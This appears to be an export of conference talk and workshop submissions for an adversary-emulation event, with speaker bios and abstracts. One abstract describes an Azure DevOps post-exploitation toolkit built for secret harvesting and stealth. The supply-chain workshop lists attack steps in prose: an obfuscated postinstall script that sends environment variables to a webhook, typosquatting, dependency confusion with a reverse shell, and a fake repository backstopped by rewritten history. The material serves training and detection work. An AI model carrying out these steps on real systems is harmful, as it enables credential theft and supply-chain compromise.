+Robert is committed to sharing his knowledge and experiences for the benefit of others. He enjoys Brazilian steakhouses and cuddling with his pugs while writing Infrastructure as Code to automate Red Team Infrastructure. 
+
+Robert is the Director of Offensive Security at Humana, Inc.
+
+",https://hackerhermanos.com,https://www.linkedin.com/in/pimentelrobert1/,https://linktr.ee/hackerhermanos,https://twitter.com/hacker_hermanos,https://cdn.sessionize.com/image/6878-400o400o1-wojNBg8f4uWhvzgZhYSa9t.png
+Establishing a Beachhead: Post-Exploitation in Azure DevOps,"You phished a token, found a leaked PAT, or popped a single low-privilege identity. Now you're staring at an Azure DevOps organization wondering what's actually within reach. This is the part that never makes the breach report: what an operator does in the hours after initial access.
+
+Azure DevOps is a pivot that most defenders overlook. It's a CI/CD plane wired straight into the cloud tenant it deploys to. It's full of secrets and standing trust nobody watches. We'll walk a full post-exploitation chain the way real intrusion sets run it: enumeration, credential harvesting, privilege escalation, and OPSEC-aware exfiltration. You'll see secrets pulled out of pipeline variables and variable groups, a misconfigured repo turned into lateral movement, and service connections abused until one forgotten environment variable bridges a single project into tenant-wide control.
+
+All of it runs on Beachhead, an open-source toolkit we're releasing at the talk. It takes ""I wonder what this does"" on one resource and turns it into a foothold across the whole tenant.
+
+This isn't offense for its own sake. It's adversary emulation. Every technique gets mapped to the groups already using it in the wild and paired with the telemetry it generates. Red teamers get a playbook they can actually reuse. Defenders get the detection side: what every step looks like in the logs.",Adversary Tools,,,,"Beachhead came out of real engagements where Azure DevOps turned out to be the fastest path to compromise. Enumeration frameworks lean hard on Entra ID and Azure Resource Manager, but ADO sits off to the side holding pipeline secrets, variable groups, and service connections that are wired straight into the cloud it deploys to. Defenders rarely watch it closely and operators rarely have tooling for it. Beachhead fills that gap.
+
+Beachhead takes a single Azure DevOps personal access token, the kind you get from a phished session, a leaked PAT in a repo, or a low-privilege identity, and turns it into a full picture of the organization. It enumerates orgs, projects, repositories, pipelines, service connections, and variable groups, then harvests secrets out of pipeline variables and variable groups, flags repos and service connections that are misconfigured or over-privileged, and maps the privilege escalation and lateral movement paths between them. The end state is the chain from the talk: one token in, tenant-wide leverage out, with OPSEC-aware exfiltration at the end.
+
+The toolkit is written mainly in Python and PowerShell. Everything authenticates with a standard ADO PAT, so there are no extra credentials to plant and nothing unusual for the service to see. Results are emitted as JSON by default, so each stage feeds cleanly into the next. Beachhead is built to stay quiet rather than smash through. Requests are rate-limited with jitter so the call pattern doesn't read as a script running flat out, and most of the calls it makes are ordinary user behavior against the standard ADO REST API, so they don't stand out in the logs. It is read-only by default and avoids failed-auth and access-denied events, which are some of the loudest signals in ADO and Entra telemetry, by respecting the PAT's actual scope instead of blindly probing. Enumeration is targeted by project and by date/time window rather than sweeping the whole org, which keeps both the request volume and the audit footprint down.
+
+What makes Beachhead worth adding to your kit is that it treats Azure DevOps as a complete attack surface rather than a single trick. Existing tools might dump a pipeline variable or list projects; Beachhead chains the whole thing, from first enumeration through service-connection abuse into tenant-wide control. This is not theoretical. Team PCP run this exact pattern in the wild, and Beachhead is built to emulate it faithfully so red teams can reproduce it and defenders can see it.
+
+Every module documents the telemetry it generates, mapped to Azure DevOps audit streams, Azure activity logs, and sign-in logs, so the toolkit ships detection content alongside the offense. That is the point: the demo is as useful to the blue team as the red. Beachhead has been tested on live engagements and is being hardened and polished ahead of DEF CON. It will be public and open-source by the talk",Jared,Dobbelaer,Adversarial Engineer at Blackbaud,"Jared Dobbelaer (Fr13ndz) is an Adversarial Engineer at Blackbaud, conducting Red Team engagements and Penetration Testing in the Cloud. 
+
+Fr13ndz enjoys creative solutions that both help targets with organizational needs and requirements, while also borrowing their bearer tokens. ",,,,,https://cdn.sessionize.com/image/a86b-400o400o1-sBnbij4U4mpRypGbyxUeQP.png
+,,,,,,,Jon,Rhodes,Adversarial Engineer at Blackbaud,Jon Rhodes is an Adversarial Engineer at Blackbaud and a member of the Synack Red Team (when he needs extra cash for new farm equipment).,,https://www.linkedin.com/in/rhodejo,,,https://cdn.sessionize.com/image/6377-400o400o1-XSsA79JKfw6DJhfShuim3n.jpg
+Beyond the Hype: The Real Role of Red Teams in an AI World,"Red Teaming is about thinking and acting like an attacker to improve an organization's defenses. In practice, it is less about flashy exploits and more about providing prioritization signals, validating and improving detection capabilities, and telling compelling stories that drive meaningful security outcomes.
+
+The rise of AI has introduced a new challenge and a new mandate. Organizations are increasingly asking Red Teams to ""use AI to hack things"" as both attackers and defenders race to understand what AI can and cannot do. To cut through the hype, the role of Red Teams to speak truth to power is more important than ever. 
+
+Our responsibility is to separate speculation from reality. To understand the capabilities of AI-powered attackers, assess how well our defenses stand up against them, and evaluate the risks introduced by new AI-driven attack surfaces. By doing so, we help organizations make informed decisions about where to invest, what to defend, and how to prepare for the threats that matter most.
+",Talk,,"* whoami
+* Adversarial Simulation 
+   * The hidden cost of accuracy
+     * When realistic simulations are expensive
+     * Why perfectly emulating attackers is not always the goal
+   * Attacker diversity 
+     * Different attackers have different objectives and tradecraft
+     * How do we cover the right ones? 
+* Role of a Red Team in an organization
+   * Provide prioritization signals 
+     * Where should the organization invest resources? 
+     * Separating the signal from the noise 
+   * Sparring partner for Blue Team 
+     * Find balance between overt and covert to avoid burnout 
+     * Avoiding overfitting to the Red Team attacker 
+     * Creating effective feedback loops 
+   * Storytellers who drive change 
+     * Turning technical findings into compelling narratives
+     * Making risk understandable
+   * Speaking truth to power 
+     * Independent assessment of security posture
+     * Challenging assumptions
+* Red Teaming and AI 
+  * Understanding how attackers are using AI
+    * Benchmarking to understand current vs. perceived capability 
+    * Leveraging AI responsibly
+  * Defending against AI powered attackers 
+    * How do our current controls fare?
+    * What are new controls we can develop 
+    * Distinguishing between a rogue agent, malicious insider, compromised insider 
+  * Protecting the AI attack surface 
+    * Agents that are eager to please 
+    * Targeting models or training data
+* Closing 
+   * The value of a Red Team is not the cool hacks. It is in helping organizations understand reality, prioritize risk, and make better security decisions. This is especially important when the technology landscape is changing faster than anyone fully understands.
+",,,Michael,Leibowitz,"Senior Principal Troublemaker, Oracle Red Team","Michael (@r00tkillah) has done hard-time in real-time. An old-school
+computer engineer by education, he spends his days hacking the
+mothership for a fortune 100 company. Previously, he developed and
+tested embedded hardware and software, fooled around with strap-on
+boot roms, mobile apps, office suites, and written some secure
+software. On nights and weekends he hacks on electronics, writes CFPs,
+and contributes to the NSA Playset.
+",,,,,https://cdn.sessionize.com/image/e763-400o400o1-GJoAeS1dh8nuHedzYeQV2x.jpg
+,,,,,,,Niranjanaa,Ragupathy,"Security Engineer Manager, Google Red Team","Niru is a Security Engineer and Manager at Google. She leads the Offensive Security team, which focuses on hacking Google to improve its overall security. In her free time, Niru enjoys doodling and creating Capture The Flag (CTF) challenges.",,,,,https://cdn.sessionize.com/image/b2f0-400o400o1-Dc4TfHQFeTWpQqUddSs7En.png
+The APT OSINT Challenge,"This hands-on workshop places participants in the role of a threat intelligence analyst, tasked with attributing real-world cyber intrusions to Advanced Persistent Threat (APT) groups using only open-source intelligence. Working from publicly available breach reports drawn from my own Breach-Report-Collection repository, attendees will practise pivoting through OSINT sources, from MITRE ATT&CK and vendor threat blogs to DOJ indictments and IoC databases, to answer the fundamental questions of threat attribution: Who did this? Who sent them? And are they still out there? No prior threat intelligence experience is required; curiosity is the only entry ticket.",Workshop,"Part 1 — Orientation & Mission Brief
+
+Participants are introduced to the workshop's core objective: to take a real public breach report, apply OSINT tradecraft, and attribute the intrusion to a named APT actor with as much specificity as possible. The facilitator explains the challenge structure and the worksheet each team will use throughout the session.
+
+Part 2 — The 10 Targeting Questions
+Every breach report is analysed against a standardised set of ten questions that drive the investigation:
+
+Can you identify the APT group responsible?
+Can you identify the country behind the APT?
+Can you identify the government agency sponsoring the APT?
+Can you identify any front companies linked to the APT?
+Can you find names of specific individuals associated with the group?
+Can you build a Diamond Model of the intrusion? (Adversary / Victim / Capability / Infrastructure)
+Is the group still active, and when was their last reported activity?
+(Plus additional source and pivot questions)
+
+
+Part 3 — Rules of Engagement
+The facilitator walks through the workshop format:
+- Each round opens with a QR code linking to a real breach report
+Participants skim the report for IoCs, victim profile, dates, TTPs, and vendor naming conventions
+- Teams pivot through OSINT sources to answer the 10 questions, citing every source
+- The group reconvenes to compare findings and discuss attribution reasoning before the next report is introduced",,,,William,Thomas,Senior Threat Intelligence Advisor,"Will Thomas is a Senior Threat Intelligence Advisor at Team Cymru with over 9 years experience in cybersecurity. He previously worked as the Head of Threat Hunting at Equinix, the world’s largest data center company, and is the co-author of the SANS FOR589 Cybercrime course and SANS Instructor. Before this, he worked for Cyjax, a CTI vendor that works with UK banks and police. He is well-known for the research on his personal blog (bushidotoken.net) and his work as the co-founder of the Curated Intel trust group. He has presented his research at various conferences including Underground Economy, DEFCON, Sleuthcon, and CyberThreatUK.",https://team-cymru.com,https://linkedin.com/in/william-t,https://bushidotoken.net,https://x.com/BushidoToken,https://cdn.sessionize.com/image/40a2-400o400o1-NoQ4aBJruv3hyj91XJTSUS.jpg
+Detection Coverage Is a Hypothesis: Testing It Through Adversarial Execution Variance,"Security teams routinely assume that known techniques are covered. This workshop interrogates that assumption through a structured purple team exercise conducted in an active lab environment. Participants will systematically execute the same adversarial techniques across multiple implementation variants, observing how subtle changes in execution method produce dramatically different telemetry, alter detection fidelity, and expose blind spots in EDR and SIEM tooling.
+ 
+The workshop emphasizes stealthy execution tradecraft as a variable rather than a constant, treating each implementation as a testable hypothesis about defender visibility. Attendees will build detections, hunt across collected telemetry, and leave with guidance for evaluating detection coverage against technique variance in their own environments.",Workshop,"1. Introductions
+2. Looking at existing detection rules
+- Out-of-the-box EDR detections
+- Public SIGMA rules
+- Custom rules seen in client environments
+3. Discussion of execution variants
+- What is a ""technique""
+- How we can perform a technique while reducing potential indicators of attack
+4. Hands-On Workshop
+- For a given MITRE TTP, participants will build out 3 execution methods
+- Participants will execute attacks in a live lab environment against a real EDR agent
+- Participants will observe the difference in response and perform basic threat hunts to identify the attacks
+- Participants will tune existing rules to cover missed variants
+5. Take-aways / Questions",,,,Connor,Jackson,Senior Consultant,"Connor Jackson is a Senior Consultant at Security Risk Advisors. With a background in penetration testing, he helps lead and execute numerous purple teams across a variety of eviroments. He also has an interest in OT, IoT, and hardware security.",,,,,https://cdn.sessionize.com/image/5b4b-400o400o1-wFMzMv56mym7kha5FXLLEC.jpg
+,,,,,,,Russell,Harvey,Senior Consultant,"Russell leads Purple Teams as a Master of Ceremonies (MC), a role that requires deep knowledge of both defensive and offensive tools and techniques. He also plays a key role in facilitating research and innovation within the purple team program, and helps develop payloads and automations for Purple Team engagements. Before his current role, Russell gained valuable experience at SRA in the CyberSOC, where he specialized in threat hunting, detection engineering, incident response, and served as a client lead.
+
+Russell graduated from the Rochester Institute of Technology (RIT) in 2022 with a B.S. in Computing Security. His professional interests extend to malware development/reverse engineering, penetration testing, and operating system internals.",,https://www.linkedin.com/in/russell-harvey-652010193,,,https://cdn.sessionize.com/image/29ae-400o400o1-w7UToUSoKQozoMuT6e7tgN.png
+,,,,,,,Nahid,Sarker,Lead Consultant,"Nahid Sarker is a Lead Consultant at Security Risk Advisors (SRA). He serves as a technical lead for the purple team program, where he plays a role in maintaining SRA’s offensive security capabilities.",https://sra.io/,https://www.linkedin.com/in/nahid-sarker/,,,https://cdn.sessionize.com/image/6855-400o400o1-a8hHrxTMy9CbZ8L1Po4kSJ.jpg
+Hunting GitHub to identify adversary TTPs in the wild”,"This hands-on workshop at Adversary Village RSAC 2026 provides a 20-minute deep dive into software supply chain attacks through practical exercises. The session will focus on the TTPs that DPRK-affiliated threat actors use to compromise software engineers, with particular emphasis on ""Contagious Interview"" campaigns. Participants will engage in CTI-based targeting and identification of key techniques, blending practical hunting exercises in GitHub and NPM to discover malicious packages and repositories in the wild with adversary emulation scenarios that walk through the complete attack chain.
+
+The workshop will demonstrate how threat actors evade detection, while also teaching defenders how to detect and prevent these increasingly common supply chain threats. By experiencing these attacks from the adversary's perspective, participants will gain critical insights into real-world compromise techniques.
+
+Things we will hunt for in GitHub and NPM:
+
+1. VS Code tasks files - RCE via automatic execution of the tasks file when compromised source code is opened in VS Code
+2. Fake fonts - hidden JavaScript payloads pretending to be font files
+3. Fake VS Code dictionary files that hide JavaScript payloads
+4. ""PolinRider"" TTPs for specific JavaScript payload appending
+5. How DPRK threat actors hide infrastructure in cloud providers
+6. Malicious npm packages with obfuscated payloads in install hooks
+7. Dependency confusion attacks targeting internal package names
+8. Backstopped GitHub repositories with fabricated commit histories",Workshop,"## Exercise 1: ""Publish the Trojan"" — Build & Deploy a Malicious npm Package
+
+**Objective:** Participants create a malicious npm package from scratch and publish it to a local registry.
+
+**Steps:**
+
+1. Write a `postinstall.js` script that exfiltrates environment variables to a controlled webhook (using a shared RequestBin or webhook.site endpoint)
+2. Obfuscate the payload using `Buffer.from()` and hex encoding to evade casual review
+3. Craft a convincing `package.json` with a typosquat name
+4. Publish the package to a local Verdaccio registry
+5. Install the malicious package on a victim VM and observe the data exfiltration
+6. Discussion: Review how defenders detect and prevent this type of attack
+
+**Why it works:** Participants walk through the exact attack chain used by DPRK and other threat actors — package creation, payload hiding, registry abuse, and data exfiltration.
+
+---
+
+## Exercise 2: ""Hijack the Dependency"" — Dependency Confusion Attack
+
+**Objective:** Execute a dependency confusion attack against a pre-configured target application.
+
+**Setup:** A simple Node.js app with a `package.json` referencing an internal scoped package is provided.
+
+**Steps:**
+
+1. Create a public package with a higher version number on a local registry
+2. Embed a reverse shell or data exfiltration payload in the install hook
+3. Trigger `npm install` on the target app
+4. Watch as the malicious package is pulled instead of the legitimate one
+5. Observe the payload execute in real time
+
+**Why it works:** Dependency confusion is a real, actively exploited vector. Participants experience firsthand why private registries and proper scoping matter for security.
+
+---
+
+## Exercise 3: ""Poison the Repo"" — GitHub Repository Backstopping
+
+**Objective:** Create a convincing fake GitHub presence to backstop a malicious package.
+
+**Steps:**
+
+1. Fork a legitimate utility repository
+2. Rewrite git history to fabricate months of commit activity using `GIT_AUTHOR_DATE` and `GIT_COMMITTER_DATE`
+3. Inject a subtle payload into one of the source files (e.g., a `fetch()` call buried in a utility function)
+4. Craft a README that mirrors the original to pass casual trust checks
+5. Review how git forensics (timestamp clustering, author analysis) can expose fabricated repositories
+
+**Why it works:** This demonstrates exactly how threat actors backstop campaigns — a technique most defenders have never seen from the attacker's perspective.",,,,Paul,McCarty,"Founder and lead researcher at OpenSourceMalware, the software supply chain threat intelligence platform.  Software supply chain offensive security crazy person.","Paul is the founder and maintainer of OpenSourceMalware, the world's largest open database and collaboration platform for software supply chain threat intel.  His day job is Head of Research at Safety and is a DevSecOps OG. He loves software supply chain research and delivering supply chain offensive security training and engagements.  He's spent the last two years deep-diving into npm and has made several discoveries about the ecosystem.  Paul founded multiple startups starting in the '90s and has worked for NASA, Boeing, Blue Cross/Blue Shield, John Deere, the US military, and the Australian government.  Paul is a frequent open-source contributor and author of several DevSecOps, software supply chain and threat modelling projects. He’s currently writing a book entitled “Hacking NPM”, and when he’s not doing that, he’s snowboarding with his wife and 3 amazing kids.",https://opensourcemalware.com,https://www.linkedin.com/in/mccartypaul/,https://opensourcemalware.com/blog,https://twitter.com/eastsidemccarty,https://cdn.sessionize.com/image/b5c9-400o400o1-HnWrCHx52wn9cNZumYTpaH.png
+,,,,,,,Jenn,Gile,"Co-Founder, OpenSourceMalware.com","Jenn Gile is a community builder and tech educator in the Security and DevOps fields. She's Co-Founder of OpenSourceMalware.com, on staff with BSides Seattle, and is an advisor at Endor Labs. Jenn previously worked at NGINX, F5, and the U.S. Department of State. Outside of work, she's deeply involved in the cycling community as a board member for 2nd Cycle.",https://www.endorlabs.com/,https://www.linkedin.com/in/jenngile,,,https://cdn.sessionize.com/image/5674-400o400o1-SbRrDKjAWjxZTz4f9CPj9z.png
+Augmented Offense: Open-Source Subdermal Implants as Hacking Tools,"This workshop includes live demonstrations and controlled hands-on labs showing how open-source subdermal implants can function as offensive cyber-physical tools. Len Noe, 213, demonstrates implant-based NFC, RFID, BLE, cryptographic identity, and magnetic biosensing workflows using isolated test equipment. Dr. Gregory Carpenter, JunkBond, maps each demonstration to adversary behavior, identity failure, physical-access risk, and defensive mitigation.
+
+The workshop examines what changes when the attacker is not carrying the hardware, but is the hardware. Attendees will observe controlled implant-based demonstrations, reproduce selected concepts using lab NFC tags, dummy RFID credentials, isolated readers, and non-production devices, and leave with practical defensive guidance for NFC, RFID, BLE, access-control, and cyber-physical identity systems.",Hands-on Activity,,,,,Gregory,"Carpenter, DrPH",Principal Partner of CW PENSEC,"Dr. Gregory Carpenter is a cybersecurity and biomedical systems strategist specializing in information warfare, deception, and the protection of complex, high-risk environments. He serves as Principal Partner at CW PENSEC, leading initiatives across cyber operations, medical device security, and global health systems.
+
+A former U.S. Army cyber, medical service and counterintelligence professional with experience supporting national-level missions, his work focuses on how threats propagate across technical, biological, and cognitive systems.
+
+Dr. Carpenter is a co-author of Reverse Deception and author of The Nation That Had to Be Built: Design, Loyalty, and the End of Conditional Union, a systems analysis of the evolution of the Constitution. He is a member of the Sons of the American Revolution, Special Operations Medical Association and a fellow at the Royal Society of the Arts.",https://kbi.ai,https://www.linkedin.com/in/gcarpenter-cso-kbi/,,https://twitter.com/gscarp12,https://cdn.sessionize.com/image/c457-400o400o1-NfE1awL396DmjpKdwiyLkY.jpg
